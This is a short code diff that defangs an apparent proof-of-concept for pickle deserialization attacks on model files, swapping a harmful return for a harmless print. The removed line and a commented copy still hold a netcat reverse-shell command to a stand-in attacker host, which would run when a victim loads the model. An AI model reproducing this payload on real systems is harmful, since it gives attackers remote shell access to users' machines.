@@ -15,7 +15,10 @@ import sys
 class MaliciousModel:
     def __reduce__(self):
         # This command runs when the victim does `torch.load('model.bin')`
-        return (os.system, ('nc -e /bin/sh attacker.com 4444',))
+        # SECURITY WARNING: The following line is commented out to prevent accidental RCE durng scans.
+        # return (os.system, ('nc -e /bin/sh attacker.com 4444',))
+        print("[-] RCE payload disabled for security.")
+        return (print, ("RCE payload disabled",))
 
 # Generating the payload
 # payload = pickle.dumps(MaliciousModel())
